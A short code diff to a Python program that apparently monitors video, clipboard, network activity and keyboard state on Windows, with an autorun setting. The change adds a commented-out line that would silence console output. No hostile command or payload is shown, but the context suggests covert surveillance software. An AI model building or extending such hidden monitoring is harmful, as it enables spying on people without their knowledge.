@@ -17,7 +17,7 @@ import video_monitor
 import clipboard_monitor
 import network_monitor
 
-
+# sys.stdout = open(os.devnull, 'w')
 hllDll = ctypes.WinDLL("User32.dll")
 VK_CAPITAL = 0x14
 AUTORUN_WINDOWS = 0
